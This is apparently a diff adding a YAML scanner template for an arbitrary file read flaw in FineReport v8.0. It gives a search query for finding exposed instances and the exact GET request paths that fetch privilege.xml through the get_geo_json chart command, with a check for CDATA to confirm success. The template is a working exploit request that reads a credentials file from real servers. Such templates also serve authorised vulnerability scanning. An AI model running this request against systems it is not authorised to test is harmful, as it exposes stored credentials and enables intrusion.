@@ -1,0 +1,29 @@
+name: 'FineReport v8.0 Arbitrary file read '
+manual: true
+query: app="fanruansem-FineReport"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"CDATA")
+  r1:
+    request:
+      method: GET
+      path: /ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"CDATA")
+expression: r0() || r1()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    Finereport is an enterprise web report tool written in pure Java, which integrates the functions of data display (report) and data entry (form).
+
+
+
+    There is an arbitrary file reading vulnerability in finereport v8.0, which can be used by attackers to read arbitrary files on the website
+  tags: Disclosure of Sensitive Information
